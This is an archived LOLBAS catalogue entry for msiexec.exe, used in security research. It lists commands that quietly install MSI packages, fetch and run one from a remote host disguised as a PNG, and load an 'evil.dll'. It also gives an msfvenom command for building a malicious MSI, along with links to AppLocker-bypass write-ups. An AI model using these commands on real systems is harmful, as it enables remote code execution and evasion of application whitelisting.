# UPDATE BOOKMARKS - PROJECT MOVED TO A DEDICATED PROJECT SITE. THIS SITE WILL NOT BE UPDATED ANYMORE, BUT WILL BE KEPT FOR HISTORICAL REASONS.
New site: https://github.com/LOLBAS-Project/LOLBAS
Web portal: https://lolbas-project.github.io/ 
## Msiexec.exe

* Functions: Execute

```
msiexec /quiet /i cmd.msi    

msiexec /q /i http://192.168.100.3/tmp/cmd.png   

msiexec /y "C:\folder\evil.dll"   

msiexec /z "C:\folder\evil.dll"   
```

Acknowledgements:
* ? - @netbiosX
* PhilipTsukerman - @PhilipTsukerman

Code sample:
* 

Resources:
* https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
* https://twitter.com/PhilipTsukerman/status/992021361106268161

Full path:
```
c:\windows\system32\msiexec.exe
c:\windows\sysWOW64\msiexec.exe
```

Notes:
Generate MSI file:
```
msfvenom -f msi -p windows/exec CMD=powershell.exe > powershell.msi    
```



